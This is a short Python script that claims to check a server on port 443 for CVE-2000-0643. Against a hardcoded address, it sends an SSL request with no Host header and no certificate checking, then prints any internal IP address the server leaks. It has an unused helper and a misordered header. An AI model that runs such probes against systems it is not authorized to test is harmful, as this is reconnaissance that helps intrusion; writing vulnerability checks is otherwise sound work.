#!/usr/bin/env python3
""" Test an IP address (port 443) for CVE-2000-0643 """

import ssl
import socket
import re

def valid_ip(address):
    try: 
        socket.inet_aton(address)
        return True
    except:
        return False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('115.70.235.22', 443))
s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
s.sendall(b'GET / HTTP/1.0\r\n\r\nConnection: close\r\n\r\n')

while True:
    new = s.recv(4096)
    if not new:
        s.close()
        break
    response = new.decode()
    pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    if pattern.search(response):
        print(pattern.search(response).group())

